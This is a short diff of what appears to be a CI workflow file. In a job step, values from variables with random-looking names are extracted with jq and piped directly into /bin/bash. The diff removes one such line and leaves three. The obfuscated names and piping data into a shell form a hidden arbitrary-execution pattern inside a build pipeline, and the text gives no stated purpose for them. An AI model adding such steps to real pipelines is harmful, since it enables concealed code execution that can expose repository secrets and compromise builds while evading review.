@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
           printf '%s' "$mis01997" | jq -r .oxx52682 | /bin/bash
           echo $edw541 | jq -r .vupiy10 | /bin/bash
-          printf '%s' "$dtef87098" | jq -r .fgevr0425 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
